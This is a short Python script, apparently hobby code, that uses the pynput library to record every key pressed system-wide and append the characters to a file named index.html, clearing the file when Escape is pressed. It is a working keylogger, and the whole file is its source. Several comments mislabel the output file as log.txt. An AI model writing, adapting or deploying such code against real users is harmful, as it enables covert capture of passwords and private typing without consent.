import os
from pynput.keyboard import Key, Listener


# actions to carry out if key pressed
def if_pressed(key):
    print(key)
    update_file(key)
    if key == Key.esc:
        clear_file()
        return False

# Writing key to appropriate file
def update_file(key):
    # Shows directory of current path
    pth = os.path.dirname(os.path.realpath(__file__))
    
    # Feel free to change the name of the file
    file_name = "index.html"

    # combine defined vars
    address = os.path.join(pth,file_name)

    # opening log.txt to write inside
    with open(address, "a") as o:

        #'' = [NOTHING]
        k = str(key).replace("'","")

        #Key.Space = [SPACE]
        if k == "Key.space":
            o.write(' ')

        #Key.backspace = [*]
        if k == "Key.backspace":
            o.write('*')

        #Key.enter = [SPACE]
        if k == "Key.enter":
            o.write(' ')

        if k == "q":
            exit()
        # exclude other keys
        elif k.find("Key") == -1:
            o.write(k)

#function clears the log.txt file to prep it for its next use
def clear_file():
    #exact same method of obtaining log.txt file path as write_file()
    pth = os.path.dirname(os.path.realpath(__file__))
    file_name = "index.html"
    address = os.path.join(pth,file_name)

    #clears the log file
    with open(address, "r+") as f:
        f.truncate(0)
        f.seek(0)

    
with Listener(on_press=if_pressed) as listener:
    listener.join()